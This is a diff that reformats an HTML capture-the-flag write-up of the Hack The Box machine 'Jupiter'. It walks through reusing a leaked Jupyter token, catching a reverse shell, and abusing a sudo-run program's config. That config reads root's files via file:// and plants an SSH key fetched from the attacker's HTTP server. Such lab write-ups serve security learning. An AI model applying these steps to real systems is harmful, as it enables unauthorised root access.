 <span class="n">jovian</span>      <span class="mi">1175</span>  <span class="mf">0.0</span>  <span class="mf">1.6</span>  <span class="mi">81344</span> <span class="mi">66504</span> <span class="err">?</span>        <span class="n">S</span>    <span class="mi">12</span><span class="p">:</span><span class="mi">12</span>   <span class="mi">0</span><span class="p">:</span><span class="mi">00</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python3</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">jupyter</span><span class="o">-</span><span class="n">notebook</span> <span class="o">--</span><span class="n">no</span><span class="o">-</span><span class="n">browser</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="o">/</span><span class="n">flares</span><span class="o">.</span><span class="n">ipynb</span>
 <span class="nd">@juno@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span>
 </pre></div>
 
-Jovian is running 'jupyter-notebook.' According to ChatGPT, Jupyter Notebook is an open-source web application that allows you to create and share interactive documents containing code, text, graphics, and results. It is widely used in fields such as data science, scientific research, education, and programming.<br/><br/>
-Checking the open ports, we observe that port '8888' is open. This appears to be a web service, so I'm going to set up port forwarding to access it through my browser. Port forwarding can be accomplished using SSH with the '-L' parameter:<br/><br/>
+Jovian is running <code>jupyter-notebook</code>. According to ChatGPT, Jupyter Notebook is an open-source web application that allows you to create and share interactive documents containing code, text, graphics, and results. It is widely used in fields such as data science, scientific research, education, and programming.<br/><br/>
+Checking the open ports, we observe that port <code>8888</code> is open. This appears to be a web service, so I'm going to set up port forwarding to access it through my browser. Port forwarding can be accomplished using SSH with the <code>-L</code> parameter:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">ssh</span> <span class="n">juno</span><span class="o">@</span><span class="mf">10.10.11.216</span> <span class="o">-</span><span class="n">L</span> <span class="mi">8888</span><span class="p">:</span><span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">8888</span>
 <span class="n">Welcome</span> <span class="n">to</span> <span class="n">Ubuntu</span> <span class="mf">22.04.2</span> <span class="n">LTS</span> <span class="p">(</span><span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="mf">5.15.0</span><span class="o">-</span><span class="mi">72</span><span class="o">-</span><span class="n">generic</span> <span class="n">x86_64</span><span class="p">)</span>
 
@@ -612,13 +612,13 @@ Checking the open ports, we observe that port '8888' is open. This appears to be
 <span class="nd">@juno@jupiter</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
-Now, when I attempt to access 'localhost' on port '8888,' I encounter the following:<br/><br/>
+Now, when I attempt to access <code>localhost</code> on port <code>8888</code>, I encounter the following:<br/><br/>
 <img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/15.png"/><br/><br/>
-It is requesting a password or token, which we currently lack. While searching for the term 'token' in the 'solar-flares' directory, I discovered some intriguing values:<br/><br/>
+It is requesting a password or token, which we currently lack. While searching for the term <code>token</code> in the <code>solar-flares</code> directory, I discovered some intriguing values:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">@juno@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span> <span class="n">grep</span> <span class="o">-</span><span class="n">r</span> <span class="n">token</span>
 </pre></div>
 
-The results are originating from the 'logs' directory, as exemplified by:<br/><br/>
+The results are originating from the <code>logs</code> directory, as exemplified by:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">@juno@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span> <span class="n">cat</span> <span class="n">logs</span><span class="o">/</span><span class="n">jupyter</span><span class="o">-</span><span class="mi">2023</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mf">59.</span><span class="n">log</span>
 <span class="p">[</span><span class="n">W</span> <span class="mi">11</span><span class="p">:</span><span class="mi">59</span><span class="p">:</span><span class="mf">22.108</span> <span class="n">NotebookApp</span><span class="p">]</span> <span class="n">Terminals</span> <span class="ow">not</span> <span class="n">available</span> <span class="p">(</span><span class="n">error</span> <span class="n">was</span> <span class="n">No</span> <span class="n">module</span> <span class="n">named</span> <span class="s1">'terminado'</span><span class="p">)</span>
 <span class="p">[</span><span class="n">I</span> <span class="mi">11</span><span class="p">:</span><span class="mi">59</span><span class="p">:</span><span class="mf">22.116</span> <span class="n">NotebookApp</span><span class="p">]</span> <span class="n">Serving</span> <span class="n">notebooks</span> <span class="kn">from</span> <span class="nn">local</span> <span class="n">directory</span><span class="p">:</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span>
@@ -639,13 +639,13 @@ The results are originating from the 'logs' directory, as exemplified by:<br/><b
 <span class="nd">@juno@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span>
 </pre></div>
 
-I will attempt to use the token 'c1b7aef7f310cd8f3143c70fb9b4b0e41a10559afeebafab' on the website. Let's see if it works:<br/><br/>
+I will attempt to use the token <code>c1b7aef7f310cd8f3143c70fb9b4b0e41a10559afeebafab</code> on the website. Let's see if it works:<br/><br/>
 <img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/16.png"/><br/><br/>
-It seems the previous token didn't work, so there's nothing more we can do. However, after trying each one individually, the token 'af894b54c19a51d83d04cd69d9d205a975cafbd882d70971' did work, and the website redirected me to the next page:<br/><br/>
+It seems the previous token didn't work, so there's nothing more we can do. However, after trying each one individually, the token <code>af894b54c19a51d83d04cd69d9d205a975cafbd882d70971</code> did work, and the website redirected me to the next page:<br/><br/>
 <img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/17.png"/><br/><br/>
-While examining the 'Running' section, I came across the following list of Jupyter running processes:<br/><br/>
+While examining the <code>Running</code> section, I came across the following list of Jupyter running processes:<br/><br/>
 <img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/18.png"/><br/><br/>
-I clicked on 'flares.ipynb,' and it redirected me to the next page:<br/><br/>
+I clicked on <code>flares.ipynb</code>, and it redirected me to the next page:<br/><br/>
 <img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/19.png"/><br/><br/>
 Since this is running Python code, I'm going to create my own notebook:<br/><br/>
 <img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/20.png"/><br/><br/>
@@ -658,7 +658,7 @@ Before running this command, I will set up an ICMP listener:<br/><br/>
 <span class="n">listening</span> <span class="n">on</span> <span class="n">tun0</span><span class="p">,</span> <span class="n">link</span><span class="o">-</span><span class="nb">type</span> <span class="n">RAW</span> <span class="p">(</span><span class="n">Raw</span> <span class="n">IP</span><span class="p">),</span> <span class="n">snapshot</span> <span class="n">length</span> <span class="mi">262144</span> <span class="nb">bytes</span>
 </pre></div>
 
-Now, I will click 'Run':<br/><br/>
+Now, I will click <code>Run</code>:<br/><br/>
 <img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/23.png"/><br/><br/>
 It worked, and I received a ping from the victim machine:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">tcpdump</span> <span class="o">-</span><span class="n">i</span> <span class="n">tun0</span> <span class="n">icmp</span> <span class="o">-</span><span class="n">n</span>
@@ -668,7 +668,7 @@ It worked, and I received a ping from the victim machine:<br/><br/>
 <span class="mi">10</span><span class="p">:</span><span class="mi">57</span><span class="p">:</span><span class="mf">44.057488</span> <span class="n">IP</span> <span class="mf">10.10.16.3</span> <span class="o">&gt;</span> <span class="mf">10.10.11.216</span><span class="p">:</span> <span class="n">ICMP</span> <span class="n">echo</span> <span class="n">reply</span><span class="p">,</span> <span class="nb">id</span> <span class="mi">2</span><span class="p">,</span> <span class="n">seq</span> <span class="mi">1</span><span class="p">,</span> <span class="n">length</span> <span class="mi">64</span>
 </pre></div>
 
-Now, I'm going to send myself a reverse shell, so I'll set up my netcat listener on port '3001':<br/><br/>
+Now, I'm going to send myself a reverse shell, so I'll set up my netcat listener on port <code>3001</code>:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
 <span class="n">Ncat</span><span class="p">:</span> <span class="n">Version</span> <span class="mf">7.94</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span> <span class="p">)</span>
 <span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="p">[::]:</span><span class="mi">3001</span>
@@ -677,7 +677,7 @@ Now, I'm going to send myself a reverse shell, so I'll set up my netcat listener
 
 I will now execute the following command:<br/><br/>
 <img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/24.png"/><br/><br/>
-And I have successfully obtained a shell as the 'Jovian' user:<br/><br/>
+And I have successfully obtained a shell as the <code>Jovian</code> user:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
 <span class="n">Ncat</span><span class="p">:</span> <span class="n">Version</span> <span class="mf">7.94</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span> <span class="p">)</span>
 <span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="p">[::]:</span><span class="mi">3001</span>
@@ -717,7 +717,7 @@ Once again, let's adjust our TTY:<br/><br/>
 <span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span>
 </pre></div>
 <h3><br>Shell as root</br></h3><br>
-Upon listing the sudoers privileges of the 'Jovian' user, we discover that he can execute the following as root without needing to provide a password:<br/><br/>
+Upon listing the sudoers privileges of the <code>Jovian</code> user, we discover that he can execute the following as root without needing to provide a password:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">-</span><span class="n">l</span>
 <span class="n">Matching</span> <span class="n">Defaults</span> <span class="n">entries</span> <span class="k">for</span> <span class="n">jovian</span> <span class="n">on</span> <span class="n">jupiter</span><span class="p">:</span>
     <span class="n">env_reset</span><span class="p">,</span> <span class="n">mail_badpass</span><span class="p">,</span>
@@ -736,7 +736,7 @@ After executing <code>/usr/local/bin/sattrack</code> as root, it returns the fol
 <span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span>
 </pre></div>
 
-I believe it's attempting to open a configuration file. Before attempting to reverse-engineer this program, I will run it with 'strace' since it's installed on the victim machine.<br/><br/>
+I believe it's attempting to open a configuration file. Before attempting to reverse-engineer this program, I will run it with <code>strace</code> since it's installed on the victim machine.<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span> <span class="n">strace</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sattrack</span>
 </pre></div>
 <img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/25.png"/><br/><br/>
@@ -753,7 +753,7 @@ Since the file doesn't exist, we'll need to find a way to create it. Sometimes, 
 <span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span>
 </pre></div>
 
-There is a path that appears to be related to 'sattrack.' Listing its contents, we encounter the following:<br/><br/>
+There is a path that appears to be related to <code>sattrack</code>. Listing its contents, we encounter the following:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">sattrack</span><span class="o">/</span><span class="n">config</span><span class="o">.</span><span class="n">json</span>
 <span class="p">{</span>
     <span class="s2">"tleroot"</span><span class="p">:</span> <span class="s2">"/tmp/tle/"</span><span class="p">,</span>
@@ -797,7 +797,7 @@ At the moment, I'm not familiar with how the program works, so I'll copy the fil
 <span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span>
 </pre></div>
 
-Now, I'll attempt to run the program once more, this time with the 'config.json' file created.<br/><br/>
+Now, I'll attempt to run the program once more, this time with the <code>config.json</code> file created.<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sattrack</span>
 <span class="n">Satellite</span> <span class="n">Tracking</span> <span class="n">System</span>
 <span class="n">tleroot</span> <span class="n">does</span> <span class="ow">not</span> <span class="n">exist</span><span class="p">,</span> <span class="n">creating</span> <span class="n">it</span><span class="p">:</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">tle</span><span class="o">/</span>
@@ -806,8 +806,8 @@ Now, I'll attempt to run the program once more, this time with the 'config.json'
 <span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span>
 </pre></div>
 
-It appears to be trying to download a file. Based on the output returned, we could deduce that it's using the 'wget' tool.<br/><br/>
-Furthermore, it has created a directory named 'tle' in <code>/tmp</code>. If we list its contents, we find a file called 'weather.txt':<br/><br/>
+It appears to be trying to download a file. Based on the output returned, we could deduce that it's using the <code>wget</code> tool.<br/><br/>
+Furthermore, it has created a directory named <code>tle</code> in <code>/tmp</code>. If we list its contents, we find a file called <code>weather.txt</code>:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">tle</span>
 <span class="n">total</span> <span class="mi">0</span>
 <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">22</span> <span class="mi">14</span><span class="p">:</span><span class="mi">17</span> <span class="n">weather</span><span class="o">.</span><span class="n">txt</span>
@@ -822,9 +822,9 @@ It seems to be downloading files from the URL addresses we specify in this part 
 <span class="p">],</span>
 </pre></div>
 
-One approach we could try is to, instead of specifying a URL to a web service, point to a system file using the 'file://' wrapper.<br/><br/>
-First, I will modify certain information in the 'config.json' file. I'll change the 'tlefile' field, which refers to the name of the file where the downloaded content will be stored. Next, I'll modify the first URL in the 'tlesources' field to point to a system file using the 'file://' wrapper.<br/><br/>
-Since this file is being executed by root, I will point it to the file '/root/root.txt' in an attempt to access the last flag:<br/><br/>
+One approach we could try is to, instead of specifying a URL to a web service, point to a system file using the <code>file://</code> wrapper.<br/><br/>
+First, I will modify certain information in the <code>config.json</code> file. I'll change the <code>tlefile</code> field, which refers to the name of the file where the downloaded content will be stored. Next, I'll modify the first URL in the <code>tlesources</code> field to point to a system file using the <code>file://</code> wrapper.<br/><br/>
+Since this file is being executed by root, I will point it to the file <code>/root/root.txt</code> in an attempt to access the last flag:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">config</span><span class="o">.</span><span class="n">json</span> 
 <span class="p">{</span>
     <span class="s2">"tleroot"</span><span class="p">:</span> <span class="s2">"/tmp/tle/"</span><span class="p">,</span>
@@ -873,7 +873,7 @@ Once modified, I will run the program as root:<br/><br/>
 </pre></div>
 
 It doesn't appear to have returned any errors; however, I closed it because HTB machines don't have internet access, so they can't download files from the specified URLs.<br/><br/>
-If everything went as planned, we should see the 'root.txt' file in the <code>/tmp/tle</code> directory:<br/><br/>
+If everything went as planned, we should see the <code>root.txt</code> file in the <code>/tmp/tle</code> directory:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">tle</span>
 <span class="n">total</span> <span class="mi">4</span>
 <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span>  <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">22</span> <span class="mi">14</span><span class="p">:</span><span class="mi">25</span> <span class="n">noaa</span><span class="o">.</span><span class="n">txt</span>
@@ -882,15 +882,15 @@ If everything went as planned, we should see the 'root.txt' file in the <code>/t
 <span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span>
 </pre></div>
 
-It seems that we have successfully read the system-level file, as unlike the other files, the 'root.txt' file has a larger size. Let's proceed to read its content:<br/><br/>
+It seems that we have successfully read the system-level file, as unlike the other files, the <code>root.txt</code> file has a larger size. Let's proceed to read its content:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">tle</span><span class="err">$</span> <span class="n">cat</span> <span class="n">root</span><span class="o">.</span><span class="n">txt</span>
 <span class="mi">4</span><span class="n">d4ff6fd5ee1c21c6d9b75116cffe223</span>
 <span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">tle</span><span class="err">$</span>
 </pre></div>
 
 We have successfully read a system-level file and obtained the final flag.<br/><br/>
-To access the system as the 'root' user, I thought about trying to list the contents of the <code>/root/.ssh/id_rsa</code> file. However, this file didn't exist on the victim machine's system.<br/><br/>
-I came up with the idea of downloading my SSH public key and storing it in the <code>/root/.ssh/authorized_keys</code> file. To do this, we need to modify certain information in the 'config.json' file:<br/><br/>
+To access the system as the <code>root</code> user, I thought about trying to list the contents of the <code>/root/.ssh/id_rsa</code> file. However, this file didn't exist on the victim machine's system.<br/><br/>
+I came up with the idea of downloading my SSH public key and storing it in the <code>/root/.ssh/authorized_keys</code> file. To do this, we need to modify certain information in the <code>config.json</code> file:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">tle</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">config</span><span class="o">.</span><span class="n">json</span>
 <span class="p">{</span>
     <span class="s2">"tleroot"</span><span class="p">:</span> <span class="s2">"/root/.ssh/"</span><span class="p">,</span>
@@ -929,9 +929,9 @@ I came up with the idea of downloading my SSH public key and storing it in the <
 <span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">tle</span><span class="err">$</span>
 </pre></div>
 
-In essence, I modified the values of the fields 'tleroot,' 'tlefile,' and 'tlesources.'<br/><br/>
-The 'tleroot' field's value is the directory where I want to store the downloaded content. The 'tlefile' field's value is the name of the file where I want to store the downloaded content. Finally, the 'tlesources' field contains the URLs from which I want to download the file's content.<br/><br/>
-In this case, 'tleroot' will point to the <code>/root/.ssh</code> directory, the name of the file that will be created with the downloaded content will be 'authorized_keys,' and the content will be downloaded from my attacker machine. Thus, I will need to host an HTTP server to serve the 'authorized_keys' file:<br/><br/>
+In essence, I modified the values of the fields <code>tleroot</code>, <code>tlefile</code>, and <code>tlesources</code>.<br/><br/>
+The <code>tleroot</code> field's value is the directory where I want to store the downloaded content. The <code>tlefile</code> field's value is the name of the file where I want to store the downloaded content. Finally, the <code>tlesources</code> field contains the URLs from which I want to download the file's content.<br/><br/>
+In this case, <code>tleroot</code> will point to the <code>/root/.ssh</code> directory, the name of the file that will be created with the downloaded content will be <code>authorized_keys</code>, and the content will be downloaded from my attacker machine. Thus, I will need to host an HTTP server to serve the <code>authorized_keys</code> file:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cp</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">elswix</span><span class="o">/.</span><span class="n">ssh</span><span class="o">/</span><span class="n">id_rsa</span><span class="o">.</span><span class="n">pub</span> <span class="n">authorized_keys</span>
 <span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span>
 <span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">0.0.0.0</span> <span class="n">port</span> <span class="mi">80</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">80</span><span class="o">/</span><span class="p">)</span> <span class="o">...</span>
@@ -949,7 +949,7 @@ We receive the GET request from the victim machine:<br/><br/>
 <span class="mf">10.10.11.216</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">22</span><span class="o">/</span><span class="n">Oct</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">11</span><span class="p">:</span><span class="mi">36</span><span class="p">:</span><span class="mi">55</span><span class="p">]</span> <span class="s2">"GET /authorized_keys HTTP/1.1"</span> <span class="mi">200</span> <span class="o">-</span>
 </pre></div>
 
-If everything has worked correctly, we should now be able to access the victim machine as the 'root' user via SSH without needing to provide credentials:<br/><br/>
+If everything has worked correctly, we should now be able to access the victim machine as the <code>root</code> user via SSH without needing to provide credentials:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">ssh</span> <span class="n">root</span><span class="o">@</span><span class="mf">10.10.11.216</span>
 <span class="n">Welcome</span> <span class="n">to</span> <span class="n">Ubuntu</span> <span class="mf">22.04.2</span> <span class="n">LTS</span> <span class="p">(</span><span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="mf">5.15.0</span><span class="o">-</span><span class="mi">72</span><span class="o">-</span><span class="n">generic</span> <span class="n">x86_64</span><span class="p">)</span>
 
